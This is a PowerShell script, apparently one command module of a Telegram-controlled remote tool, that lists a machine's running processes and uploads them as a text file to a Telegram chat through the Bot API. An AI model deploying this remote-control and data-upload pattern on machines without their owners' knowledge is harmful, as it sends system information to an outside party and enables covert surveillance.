param(
    [Parameter(Mandatory=$true)]
    [string]$chatId,
    [Parameter(Mandatory=$true)]
    [string]$message,
    [Parameter(Mandatory=$false)]
    [string]$commandArgs
)



$processFile = $null
try {
    $tempDir = [System.IO.Path]::GetTempPath()
    $processFile = Join-Path -Path $tempDir -ChildPath "processes_$(Get-Date -Format 'yyyyMMddHHmmss').txt"
    
    $processes = Get-Process | Select-Object -Property Name, Id, CPU, WorkingSet, StartTime | Sort-Object -Property CPU -Descending
    $processList = "SYSTEM PROCESSES REPORT`r`n`r`nGenerated: $(Get-Date)`r`n`r`n"
    $processList += $processes | Format-Table -AutoSize | Out-String
    
    Set-Content -Path $processFile -Value $processList -Force
    
    $fileUrl = "https://api.telegram.org/bot$script:botToken/sendDocument"
    $fileBinary = [System.IO.File]::ReadAllBytes($processFile)
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`"",
        "",
        $chatId,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"processes.txt`"",
        "Content-Type: text/plain",
        "",
        [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileBinary),
        "--$boundary--"
    ) -join $LF
    
    $contentType = "multipart/form-data; boundary=$boundary"
    $response = Invoke-RestMethod -Uri $fileUrl -Method Post -ContentType $contentType -Body $bodyLines
    
    Send-TelegramMessage -chatId $chatId -message "Processes saved and sent as text file."
}
catch {
    Send-TelegramMessage -chatId $chatId -message "Error getting processes: $($_.Exception.Message)"
}
finally {
    if (Test-Path -Path $processFile) {
        Remove-Item -Path $processFile -Force -ErrorAction SilentlyContinue
    }
}
